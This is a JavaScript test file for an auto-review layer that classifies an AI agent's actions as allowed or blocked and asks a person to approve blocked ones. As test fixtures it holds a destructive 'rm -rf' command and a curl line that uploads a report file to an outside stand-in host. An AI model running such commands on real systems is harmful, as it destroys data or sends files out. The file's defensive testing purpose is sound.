import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { AUTO_REVIEW_MODES_ENFORCE, AUTO_REVIEW_MODES_OFF, autoReviewModesFor, createApprovalRegistry,
  createAutoReviewController, createLocalClassifier, rokbotCardText, startLocalAutoReview } from '../runtime/host-auto-review.mjs';
import { localAutoReviewOptions } from '../runtime/local-harness-bridge.mjs';

import { BLOCKED_EFFECTS, OUTBOUND_AUTHORIZATIONS, REQUIRED, SHIPPED_PARAMETERS, TOOL_NAME, contractDrift,
  readClassification } from '../runtime/auto-review-contract.mjs';

// The mock tool is the shipped schema itself (names, types, enums, required), so the classifier is
// always tested against the contract the Host is read against; the real-seed test below checks
// that contract against the shipped library.
const tool = { type: 'function', function: { name: TOOL_NAME, description: 'Report whether Auto-review should allow or block',
  parameters: structuredClone(SHIPPED_PARAMETERS) } };
const library = { CLASSIFY_SAND_AUTO_REVIEW_ACTION_TOOL: tool, SAND_AUTO_REVIEW_CLASSIFIER_SYSTEM_PROMPT: 'Review.',
  SmartModeClassifierResult: class { constructor(value) { Object.assign(this, value); } } };
const reply = content => new Response(JSON.stringify({ id: 'msg_1', model: 'm', stop_reason: 'end_turn',
  usage: { input_tokens: 1, output_tokens: 1 }, content }), { status: 200, headers: { 'content-type': 'application/json' } });
const answer = input => () => reply([{ type: 'tool_use', id: 't1', name: TOOL_NAME, input }]);
const textOnly = () => reply([{ type: 'text', text: 'Looks fine to me.' }]);
// What the shipped schema asks for: an ALLOW has an empty action_description, a BLOCK one sentence.
const ALLOW = { decision: 'ALLOW', reason: 'Read-only command', blocked_effect: 'none', outbound_authorization: 'not_outbound',
  action_description: '' };
const BLOCK = { decision: 'BLOCK', reason: 'Delete the /tmp/x directory. It cannot be undone.', blocked_effect: 'destructive_data_loss',
  outbound_authorization: 'not_outbound', action_description: 'Delete the /tmp/x directory and everything in it',
  proposed_allow_rule: 'Run "rm -rf" on scratch directories under /tmp on RokBot\'s computer' };
const SEND = { decision: 'BLOCK', reason: 'Email the report to an outside address. It leaves this computer.',
  blocked_effect: 'outbound_or_binding_external_effect', outbound_authorization: 'unauthorized_destination', who_sees_it: 'x@outside.test',
  action_description: 'Send report.pdf to x@outside.test in Gmail', proposed_allow_rule: 'Emails to x@outside.test' };
const valid = answer(ALLOW);

async function classifier(t, replies) {
  const usageDirectory = await mkdtemp(join(tmpdir(), 'review-test-'));
  t.after(() => rm(usageDirectory, { recursive: true, force: true }));
  const logs = [], requests = [], bodies = [];
  const instance = createLocalClassifier({ apiFormat: 'anthropic', baseUrl: 'https://api.example.com', apiKey: 'k', model: 'm', usageDirectory },
    library, { log: message => logs.push(message), fetchImpl: async (url, options) => {
      requests.push(url); bodies.push(JSON.parse(options.body)); return replies.shift()(); } });
  return { instance, logs, requests, bodies };
}
const args = { target: { action: 'run', arguments: { command: 'ver' } }, conversationContext: [{ role: 'user', content: 'Check the version' }] };
const withPolicy = (policy, extra = {}) => ({ ...args, target: { action: 'mcp', arguments: { tool_name: 'send_email', ...extra,
  project_permissions: { auto_run: { allow_instructions: [], block_instructions: [], ...policy } } } } });
const read = (raw, target = args.target) => readClassification(raw, SHIPPED_PARAMETERS, target);

test('the contract constants are the shipped schema (and drift is reported)', () => {
  assert.deepEqual(contractDrift(SHIPPED_PARAMETERS), []);
  assert.deepEqual(SHIPPED_PARAMETERS.required, ['decision', 'reason', 'blocked_effect', 'outbound_authorization', 'action_description']);
  assert.deepEqual(contractDrift({ ...SHIPPED_PARAMETERS, required: REQUIRED.filter(name => name !== 'action_description') }),
    ['action_description is no longer required']);
  const changed = structuredClone(SHIPPED_PARAMETERS);
  changed.properties.blocked_effect.enum.push('new_effect');
  changed.properties.extra = { type: 'string' };
  assert.deepEqual(contractDrift(changed), [`blocked_effect enum is ${JSON.stringify([...BLOCKED_EFFECTS, 'new_effect'])}`, 'extra is new']);
});

const seed = process.env.ROKBOT_TEST_HOST_SEED;
test('the contract matches CLASSIFY_SAND_AUTO_REVIEW_ACTION_TOOL in the shipped library', { skip: !seed && 'set ROKBOT_TEST_HOST_SEED' }, async t => {
  const { createRequire } = await import('node:module');
  const shipped = createRequire(import.meta.url)(join(seed, 'host-library.cjs'));
  const real = shipped.CLASSIFY_SAND_AUTO_REVIEW_ACTION_TOOL;
  assert.equal(real.function.name, TOOL_NAME);
  assert.deepEqual(contractDrift(real.function.parameters), []);
  // The real result message takes the verdict as is: rules become SmartModeClassifierAppliedRule
  // messages with the ALLOW / CUSTOM_RULE values the runner reads as 'allow' / 'custom_rule'.
  const usageDirectory = await mkdtemp(join(tmpdir(), 'review-test-'));
  t.after(() => rm(usageDirectory, { recursive: true, force: true }));
  const instance = createLocalClassifier({ apiFormat: 'anthropic', baseUrl: 'https://api.example.com', apiKey: 'k', model: 'm', usageDirectory },
    shipped, { fetchImpl: async () => answer({ ...ALLOW, matched_allow_instruction: 'Emails to a@x.com' })() });
  const result = await instance.execute(undefined, withPolicy({ allow_instructions: ['Emails to a@x.com'] }));
  assert.deepEqual(result.toJson(), { success: { decision: 'SMART_MODE_CLASSIFIER_DECISION_ALLOW', appliedRules: [{
    effect: 'SMART_MODE_CLASSIFIER_RULE_EFFECT_ALLOW', text: 'Emails to a@x.com', source: 'SMART_MODE_CLASSIFIER_RULE_SOURCE_CUSTOM_RULE' }] } });
});

test('a malformed classification is retried once, with what was wrong, and then succeeds', async t => {
  const { instance, logs, requests, bodies } = await classifier(t, [textOnly, valid]);
  const result = await instance.execute(undefined, args);
  assert.equal(result.result.value.decision, 1);
  assert.equal(requests.length, 2);
  assert.match(logs[0], /retrying after: Auto-review model did not return one complete classification/);
  assert.match(logs[1], /^Local auto-review ALLOW; model=m; request=msg_1$/);
  assert.doesNotMatch(bodies[0].system, /previous answer/);
  assert.match(bodies[1].system, /Your previous answer could not be used: Auto-review model did not return one complete classification\. Call the classify_auto_review_action tool again/);
});

test('an unusable BLOCK is retried with its problem, and a second one fails closed', async t => {
  const broken = answer({ ...BLOCK, blocked_effect: 'something_else' });
  const { instance, logs, requests, bodies } = await classifier(t, [broken, broken]);
  await assert.rejects(instance.execute(undefined, args), /A BLOCK needs blocked_effect/);
  assert.equal(requests.length, 2);
  assert.match(bodies[1].system, /previous answer could not be used: A BLOCK needs blocked_effect, one of none, /);
  assert.match(logs.at(-1), /Local auto-review failed: A BLOCK needs blocked_effect/);
});

test('a second malformed classification fails and is logged', async t => {
  const { instance, logs, requests } = await classifier(t, [textOnly, textOnly]);
  await assert.rejects(instance.execute(undefined, args), /did not return one complete classification/);
  assert.equal(requests.length, 2);
  assert.match(logs.at(-1), /Local auto-review failed/);
});

test('service errors are not retried', async t => {
  const { instance, logs, requests } = await classifier(t, [() => new Response('{"error":{"message":"overloaded"}}', { status: 529 })]);
  await assert.rejects(instance.execute(undefined, args));
  assert.equal(requests.length, 1);
  assert.match(logs.at(-1), /Local auto-review failed/);
});

test('the configured Host model is asked and a BLOCK carries everything the card shows', async t => {
  const { instance, logs, requests } = await classifier(t, [answer(BLOCK)]);
  const result = await instance.execute(undefined, { ...args, target: { action: 'run', arguments: { command: 'rm -rf /tmp/x' } } });
  assert.equal(requests[0], 'https://api.example.com/v1/messages');
  assert.deepEqual(result.result.value, { decision: 2, blockReason: BLOCK.reason, actionDescription: BLOCK.action_description,
    blockedEffect: 'destructive_data_loss', proposedAllowRule: BLOCK.proposed_allow_rule });
  assert.match(logs.at(-1), /^Local auto-review BLOCK; model=m; request=msg_1$/);
});

test('an ALLOW that follows the schema (empty action_description) is accepted on the first answer', async t => {
  for (const extra of [{}, { blocked_effect: 'outbound_or_binding_external_effect', outbound_authorization: 'trusted_destination', who_sees_it: 'a@x.com' }]) {
    const { instance, logs, requests } = await classifier(t, [answer({ ...ALLOW, ...extra })]);
    assert.deepEqual((await instance.execute(undefined, args)).result.value, { decision: 1 });
    assert.equal(requests.length, 1);
    assert.deepEqual(logs, ['Local auto-review ALLOW; model=m; request=msg_1']);
  }
});

test('an ALLOW is never turned into a card for fields only a BLOCK needs', () => {
  for (const raw of [
    { decision: 'ALLOW' }, // every other required field missing
    { ...ALLOW, reason: '' },
    { ...ALLOW, action_description: 'Lists the files' },
    { ...ALLOW, blocked_effect: 'made_up', outbound_authorization: 42 },
    { ...ALLOW, proposed_allow_rule: 'Run ls', proposed_allow_rule_replaces: 'Run ls' },
  ]) assert.deepEqual(read(raw).verdict, { decision: 'ALLOW', appliedRules: [] }, JSON.stringify(raw));
  assert.deepEqual(read({ decision: 'ALLOW' }).notes,
    ['reason is missing', 'blocked_effect is missing', 'outbound_authorization is missing', 'action_description is missing']);
});

test('every BLOCK effect reads as the schema describes it', () => {
  for (const effect of BLOCKED_EFFECTS.filter(effect => effect !== 'none' && !effect.includes('outbound') && !effect.includes('exfil'))) {
    const { verdict } = read({ ...BLOCK, blocked_effect: effect });
    assert.equal(verdict.decision, 'BLOCK', effect);
    assert.equal(verdict.blockedEffect, effect);
  }
  for (const effect of ['outbound_or_binding_external_effect', 'data_or_credential_exfiltration'])
    assert.equal(read({ ...SEND, blocked_effect: effect }).verdict.decision, 'BLOCK', effect);
  // [decision] "Must be ALLOW when blocked_effect is 'none' or outbound_authorization is trusted_destination";
  // [prompt] a BLOCK naming (1)/(2) with trusted_destination or no who_sees_it "is treated as ALLOW".
  for (const [raw, why] of [
    [{ ...BLOCK, blocked_effect: 'none' }, 'blocked_effect is none'],
    [{ ...SEND, outbound_authorization: 'trusted_destination' }, 'its destination is trusted_destination'],
    [{ ...SEND, who_sees_it: undefined }, 'who_sees_it is missing'],
    [{ ...SEND, blocked_effect: 'data_or_credential_exfiltration', who_sees_it: '  ' }, 'who_sees_it is missing'],
  ]) {
    const { verdict, notes } = read(raw);
    assert.deepEqual(verdict, { decision: 'ALLOW', appliedRules: [] }, why);
    assert.ok(notes.includes(`BLOCK treated as ALLOW: ${why}`), notes.join());
  }
  // Answers the contract gives no reading for are asked again, never let through.
  for (const [raw, message] of [
    [{ ...BLOCK, blocked_effect: undefined }, /A BLOCK needs blocked_effect/],
    [{ ...BLOCK, outbound_authorization: 'maybe' }, /A BLOCK needs outbound_authorization, one of not_outbound, trusted_destination, unauthorized_destination/],
    [{ ...SEND, outbound_authorization: 'not_outbound' }, /needs outbound_authorization unauthorized_destination/],
    [{ ...BLOCK, outbound_authorization: 'trusted_destination' }, /is not outbound, so outbound_authorization must be not_outbound/],
    [{ ...BLOCK, decision: 'block' }, /decision must be one of ALLOW, BLOCK/],
    [{ ...BLOCK, decision: undefined }, /decision must be one of/],
    [[BLOCK], /not a JSON object/],
  ]) assert.throws(() => read(raw), message);
  assert.deepEqual(OUTBOUND_AUTHORIZATIONS, SHIPPED_PARAMETERS.properties.outbound_authorization.enum);
});

test('a BLOCK with an empty reason or action_description still makes its card instead of an error card', async t => {
  // The runner falls back to "Blocked by Auto-review" and leaves the description off the card.
  const { instance, logs, requests } = await classifier(t, [answer({ ...BLOCK, reason: ' ', action_description: '' })]);
  const result = await instance.execute(undefined, args);
  assert.equal(requests.length, 1);
  assert.deepEqual(result.result.value, { decision: 2, blockedEffect: 'destructive_data_loss', proposedAllowRule: BLOCK.proposed_allow_rule });
  assert.match(logs.at(-1), /^Local auto-review BLOCK; .*; off-contract: a BLOCK reason is empty; a BLOCK action_description is empty$/);
});

test('proposed_allow_rule follows the schema: BLOCK yes, trusted_block_instruction and ALLOW no, propose_allow_rule always', () => {
  assert.equal(read(BLOCK).verdict.proposedAllowRule, BLOCK.proposed_allow_rule);
  assert.ok(read({ ...BLOCK, proposed_allow_rule: undefined }).notes.includes('proposed_allow_rule is missing'));
  const ruleBlock = { ...BLOCK, blocked_effect: 'trusted_block_instruction', matched_block_instruction: 'Never delete files' };
  const asked = withPolicy({ block_instructions: ['Never delete files'] }).target;
  assert.deepEqual(read(ruleBlock, asked).verdict, { decision: 'BLOCK', blockReason: BLOCK.reason, actionDescription: BLOCK.action_description,
    blockedEffect: 'trusted_block_instruction', appliedRules: [{ effect: 2, source: 1, text: 'Never delete files' }] });
  assert.equal(read({ ...ALLOW, proposed_allow_rule: 'Run ls' }).verdict.proposedAllowRule, undefined);
  const proposing = withPolicy({}, { purpose: 'propose_allow_rule' }).target;
  assert.equal(read({ ...ALLOW, proposed_allow_rule: 'Emails to a@x.com' }, proposing).verdict.proposedAllowRule, 'Emails to a@x.com');
  assert.ok(read(ALLOW, proposing).notes.includes('proposed_allow_rule is missing'));
});

test('proposed_allow_rule_replaces is kept only when it is a saved Allow rule the proposal keeps word for word', () => {
  const policy = withPolicy({ allow_instructions: ['Emails to a@x.com'] }).target;
  const extend = (rule, replaces) => read({ ...SEND, proposed_allow_rule: rule, proposed_allow_rule_replaces: replaces }, policy).verdict;
  assert.equal(extend('Emails to a@x.com or x@outside.test', 'Emails to a@x.com').proposedAllowRuleReplaces, 'Emails to a@x.com');
  assert.equal(extend('Emails to x@outside.test', 'Emails to a@x.com').proposedAllowRuleReplaces, undefined); // drops a word
  assert.equal(extend('Emails to a@x.com or x@outside.test', 'Emails to b@x.com').proposedAllowRuleReplaces, undefined); // not saved
  assert.equal(extend('Emails to a@x.com or x@outside.test', 'Emails to b@x.com').proposedAllowRule, 'Emails to a@x.com or x@outside.test');
  assert.equal(read({ ...SEND, proposed_allow_rule: '', proposed_allow_rule_replaces: 'Emails to a@x.com' }, policy).verdict.proposedAllowRuleReplaces, undefined);
});

test('an allow-list hit reaches the runner as the saved Allow rule, so the send is not held for a card', async t => {
  // The runner holds an ALLOWed send for a card (cardReason send_hold) unless appliedRules carries
  // an allow / custom_rule entry equal to a saved Allow rule (ownerAllowRuleCoversSend,
  // recipientAllowedBySavedRule). Before, the local classifier never returned appliedRules.
  const saved = 'Emails to a@x.com';
  const { instance, requests } = await classifier(t, [answer({ ...ALLOW, matched_allow_instruction: saved })]);
  const result = await instance.execute(undefined, withPolicy({ allow_instructions: [saved] }));
  assert.equal(requests.length, 1);
  assert.deepEqual(result.result.value, { decision: 1, appliedRules: [{ effect: 1, source: 1, text: saved }] });
  const ruleEffects = { 1: 'allow', 2: 'ask_first' }, ruleSources = { 1: 'custom_rule', 2: 'team_rule' }; // sandAutoReviewAppliedRules
  const runnerRules = result.result.value.appliedRules.map(rule => ({ effect: ruleEffects[rule.effect], source: ruleSources[rule.source], text: rule.text }));
  assert.ok(runnerRules.some(rule => rule.effect === 'allow' && rule.source === 'custom_rule' && rule.text === saved));

  // A rule the model made up is not a saved one and is not passed on.
  const invented = read({ ...ALLOW, matched_allow_instruction: 'Emails to anyone' }, withPolicy({ allow_instructions: [saved] }).target);
  assert.deepEqual(invented.verdict.appliedRules, []);
  assert.ok(invented.notes.includes('matched_allow_instruction is not a saved Allow rule; dropped'));
  // Whatever the decision ([matched_allow_instruction]); a matching block rule still wins.
  assert.deepEqual(read({ ...SEND, matched_allow_instruction: ` ${saved} ` }, withPolicy({ allow_instructions: [saved] }).target).verdict.appliedRules,
    [{ effect: 1, source: 1, text: saved }]);
});

// --- Approval cards -------------------------------------------------------------------------

function cardHarness({ ttlMs = 60_000 } = {}) {
  const registry = createApprovalRegistry();
  const posted = [], settled = [], awaiting = [];
  const controller = createAutoReviewController({ agentId: 'bot-1', registry, ttlMs,
    postCard: message => { posted.push(message); return `send-${posted.length}`; },
    settleCard: change => settled.push(change), setAwaiting: state => awaiting.push(state) });
  return { registry, controller, posted, settled, awaiting };
}
const shellRequest = (extra = {}) => ({ agentId: 'bot-1', surface: 'box_shell', fingerprint: 'fp-1', toolCallId: 'call-1',
  reason: 'Deletes a directory tree', summary: 'Run rm -rf /tmp/x', summaryCopy: { kind: 'shell', params: { surface: 'box_shell' } },
  command: 'rm -rf /tmp/x', proposedRule: 'Allow deleting /tmp scratch dirs', expiryPolicy: 'ttl', signal: new AbortController().signal, ...extra });
const tick = () => new Promise(resolve => setImmediate(resolve));

test('the Auto-review switch enforces every runner surface, and off reviews none', () => {
  assert.deepEqual(autoReviewModesFor({ isEnabled: true, allowInstructions: [], blockInstructions: [] }), AUTO_REVIEW_MODES_ENFORCE);
  assert.deepEqual(autoReviewModesFor({ isEnabled: false }), AUTO_REVIEW_MODES_OFF);
  assert.deepEqual(autoReviewModesFor(undefined), AUTO_REVIEW_MODES_OFF);
  assert.deepEqual(Object.keys(AUTO_REVIEW_MODES_ENFORCE).sort(),
    ['automationWrite', 'boxShell', 'cloudAgent', 'computer', 'hostShell', 'mcp', 'subagentLaunch']);
  assert.ok(Object.values(AUTO_REVIEW_MODES_ENFORCE).every(mode => mode === 'enforce'));
  assert.ok(Object.values(AUTO_REVIEW_MODES_OFF).every(mode => mode === 'off'));
});

test('a BLOCK the model escalates posts a native approval card and waits; approving runs the call', async () => {
  const { registry, controller, posted, settled, awaiting } = cardHarness();
  const decision = controller.requestApproval(shellRequest());
  await tick();
  assert.equal(posted.length, 1);
  const [card] = posted;
  assert.equal(card.type, 'auto-review-approval');
  assert.equal(card.approval.status, 'pending');
  assert.equal(card.approval.surface, 'box_shell');
  assert.equal(card.approval.command, 'rm -rf /tmp/x');
  assert.equal(card.approval.reason, 'Deletes a directory tree');
  assert.equal(card.approval.proposedRule, 'Allow deleting /tmp scratch dirs');
  assert.equal(typeof card.approval.requestId, 'string');
  assert.equal(card.approval.signal, undefined);
  assert.deepEqual(awaiting.at(-1), { tabId: 'auto-review', reason: 'Run rm -rf /tmp/x', since: card.approval.createdAtMs });
  assert.deepEqual(controller.getPendingApprovals().map(item => item.toolCallId), ['call-1']);
  // Another action may not start while the card waits.
  assert.match((await controller.requestApproval(shellRequest({ toolCallId: 'call-2' }))).reason, /waiting for Auto-review approval/);

  assert.equal(registry.resolve({ requestId: card.approval.requestId, agentId: 'other-bot', resolution: 'approved' }), false);
  assert.equal(registry.resolve({ requestId: card.approval.requestId, agentId: 'bot-1', entryId: 'send-1', resolution: 'approved' }), true);
  assert.deepEqual(await decision, { approved: true });
  await tick();
  assert.deepEqual(settled, [{ entryId: 'send-1', requestId: card.approval.requestId, status: 'approved' }]);
  assert.equal(awaiting.at(-1), null);
  assert.equal(controller.getPendingApprovals().length, 0);
  assert.equal(controller.approvedFingerprintFor('call-1'), 'fp-1');
  assert.equal(controller.cardReasonFor({ toolCallId: 'call-1', fingerprint: 'fp-1' }), 'Deletes a directory tree');
  // A second answer to the same card is stale.
  assert.equal(registry.resolve({ requestId: card.approval.requestId, resolution: 'denied' }), false);
});

test('approval cards say RokBot, never "Grok Bot", in every text a person sees', async () => {
  const { controller, posted, awaiting } = cardHarness();
  const decision = controller.requestApproval(shellRequest({ surface: 'computer',
    summary: 'Click \u201CSave\u201D on Grok Bot\'s computer',
    reason: 'Grok Bot wants to send your files to an unknown site. Grok Bot will connect to it from your chats.',
    cardReason: 'Grok Bot asks before it uploads files', actionDescription: 'Grok Bot uploads report.pdf',
    cautionNote: 'Grok Bot can\'t undo this', blockedEffect: 'Grok Bot would share report.pdf',
    command: 'curl --data @report.pdf https://example.test/grok-bot', fullRequest: '{"note":"Grok Bot"}' }));
  await tick();
  const { approval } = posted[0];
  assert.equal(approval.summary, 'Click \u201CSave\u201D on RokBot\'s computer');
  assert.equal(approval.reason, 'RokBot wants to send your files to an unknown site. RokBot will connect to it from your chats.');
  for (const field of ['summary', 'reason', 'cardReason', 'actionDescription', 'cautionNote', 'blockedEffect']) {
    assert.match(approval[field], /RokBot/, field);
    assert.doesNotMatch(approval[field], /Grok Bot/, field);
  }
  assert.equal(awaiting.at(-1).reason, approval.summary, 'list badge / push show the RokBot summary');
  assert.equal(controller.cardReasonFor({ toolCallId: 'call-1' }), approval.reason);
  // What will run is shown as it is.
  assert.equal(approval.command, 'curl --data @report.pdf https://example.test/grok-bot');
  assert.equal(approval.fullRequest, '{"note":"Grok Bot"}');
  controller.resolveApproval(approval.requestId, 'denied');
  await decision;
});

test('rokbotCardText renames the product outside quoted user content only', () => {
  assert.equal(rokbotCardText('Open \u201Chttps://x.test/Grok Bot\u201D in Grok Bot\'s browser'),
    'Open \u201Chttps://x.test/Grok Bot\u201D in RokBot\'s browser');
  assert.equal(rokbotCardText('Type \u201Chi Grok Bot\u201D on Grok Bot\'s computer, then Grok Bot presses Enter'),
    'Type \u201Chi Grok Bot\u201D on RokBot\'s computer, then RokBot presses Enter');
  assert.equal(rokbotCardText('Run rm -rf /tmp/x'), 'Run rm -rf /tmp/x');
  assert.equal(rokbotCardText(undefined), undefined);
});

test('denying a card returns the refusal to the model and marks the card denied', async () => {
  const { controller, posted, settled } = cardHarness();
  const decision = controller.requestApproval(shellRequest());
  await tick();
  assert.equal(controller.resolveApproval(posted[0].approval.requestId, 'denied'), true);
  const answer = await decision;
  assert.equal(answer.approved, false);
  assert.match(answer.reason, /^The user declined this action on its approval card, so nothing ran/);
  await tick();
  assert.equal(settled[0].status, 'denied');
  assert.equal(controller.approvedFingerprintFor('call-1'), undefined);
});

test('"always" approves (the client saved the allow rule itself)', async () => {
  const { controller, posted, settled } = cardHarness();
  const decision = controller.requestApproval(shellRequest());
  await tick();
  controller.resolveApproval({ requestId: posted[0].approval.requestId, resolution: 'always' });
  assert.deepEqual(await decision, { approved: true });
  await tick();
  assert.equal(settled[0].status, 'always');
});

test('an unanswered card expires after its TTL', async () => {
  const { controller, settled, awaiting } = cardHarness({ ttlMs: 20 });
  const answer = await controller.requestApproval(shellRequest());
  assert.equal(answer.approved, false);
  assert.match(answer.reason, /approval card expired before anyone answered it/);
  await tick();
  assert.equal(settled[0].status, 'expired');
  assert.equal(controller.retiredCauseFor('call-1'), 'ttl');
  assert.equal(awaiting.at(-1), null);
});

test('a new user message, an interrupted call or turning review off expires the waiting card', async () => {
  for (const [end, cause] of [
    [c => c.beginUserMessageEpoch({ ownerWrote: true }), 'user_redirect'],
    [(c, abort) => abort.abort(), 'cancelled'],
    [c => c.expireSurfaces(new Set(['box_shell', 'host_shell'])), 'settings_change'],
    [c => c.expire('session_end'), 'session_end'],
  ]) {
    const { controller, settled } = cardHarness();
    const abort = new AbortController();
    const decision = controller.requestApproval(shellRequest({ signal: abort.signal }));
    await tick();
    controller.expireSurfaces(new Set(['mcp'])); // another surface: the card stays
    assert.equal(controller.getPendingApprovals().length, 1);
    end(controller, abort);
    assert.equal((await decision).approved, false, cause);
    await tick();
    assert.equal(settled[0].status, 'expired', cause);
    assert.equal(controller.retiredCauseFor('call-1'), cause);
  }
});

test('the auto-review extension resolves live cards and leaves unknown ones to the stale path', async () => {
  const staleCalls = [];
  class AutoReviewService {
    constructor(deps) { this.deps = deps; }
    async resolveApproval(args) { staleCalls.push(args); throw new Error('auto-review/stale'); }
    sweepStaleAwaitingBadges() {}
  }
  const transcript = { createAwaitingStateSink: () => ({}), listAgentIds: () => [], expireAllPendingAutoReviewApprovalCards: async () => {} };
  const logs = [];
  const service = startLocalAutoReview({ host: { log: message => logs.push(message) }, onStop() {}, deps: { transcript } },
    { ...library, AutoReviewService }, { model: 'm' });
  assert.equal(typeof service.createClassifierExecutor().execute, 'function');
  const posted = [];
  const controller = service.createController({ agentId: 'bot-1', postCard: message => { posted.push(message); return 'send-9'; },
    settleCard() {}, setAwaiting() {} });
  const decision = controller.requestApproval(shellRequest());
  await tick();
  const { requestId } = posted[0].approval;
  await service.resolveApproval({ entryId: 'send-9', requestId, resolution: 'approved', agentId: 'bot-1' });
  assert.deepEqual(await decision, { approved: true });
  assert.equal(staleCalls.length, 0);
  await assert.rejects(service.resolveApproval({ entryId: 'send-9', requestId, resolution: 'approved', agentId: 'bot-1' }), /stale/);
  assert.equal(staleCalls.length, 1);
  assert.ok(logs.some(line => /approval card shown/.test(line)) && logs.some(line => /card approved/.test(line)));
});

test('runner options: the switch drives the modes, the Host model classifies, and the controller posts into the Bot', async () => {
  let instructions = { isEnabled: true, allowInstructions: [], blockInstructions: ['never delete files'] };
  const classifierExecutor = { execute() {} };
  const posted = [], awaiting = [], emitted = [];
  const entry = { id: 'send-1', kind: 'send-message', message: null };
  const tm = {
    widgetResponses: { settlePendingAutoReviewApprovalsOnSession: () => false },
    sessionStore: { setAwaitingUserResponseForTab: async (...args) => awaiting.push(args) },
    roster: { emit: (...args) => emitted.push(args), emitAgentUpdate: async () => {} },
  };
  const session = { id: 'bot-1', db: { updateTranscriptEntry: (id, update) => { if (id === entry.id) Object.assign(entry, update(entry)); } } };
  let created;
  const autoReviewExt = {
    createClassifierExecutor: () => classifierExecutor,
    createController: options => (created = createAutoReviewController({ ...options, registry: createApprovalRegistry() })),
  };
  const options = localAutoReviewOptions({ tm, session, autoReviewExt, settingsExt: { getAutoReviewInstructions: () => instructions },
    postCard: message => { posted.push(message); entry.message = message; return entry.id; } });
  assert.equal(options.autoReviewClassifierExecutor, classifierExecutor);
  assert.equal(options.autoReviewController, created);
  assert.deepEqual(options.getAutoReviewInstructions(), instructions);
  assert.deepEqual(options.getAutoReviewModes(), AUTO_REVIEW_MODES_ENFORCE);
  instructions = { ...instructions, isEnabled: false };
  assert.deepEqual(options.getAutoReviewModes(), AUTO_REVIEW_MODES_OFF);

  const decision = created.requestApproval(shellRequest());
  await tick();
  assert.equal(posted.length, 1);
  assert.deepEqual(awaiting[0].slice(0, 2), ['bot-1', 'auto-review']);
  created.resolveApproval(posted[0].approval.requestId, 'denied');
  await decision;
  await tick();
  assert.equal(entry.message.approval.status, 'denied');
  assert.equal(emitted.at(-1)[0].type, 'updated');
  assert.equal(awaiting.at(-1)[2], null);
});

test('without an auto-review extension the runner gets no classifier or controller and reviews nothing', () => {
  const options = localAutoReviewOptions({ tm: {}, session: { id: 'bot-1' }, postCard() {} });
  assert.equal(options.autoReviewClassifierExecutor, undefined);
  assert.equal(options.autoReviewController, undefined);
  assert.deepEqual(options.getAutoReviewModes(), AUTO_REVIEW_MODES_OFF);
});
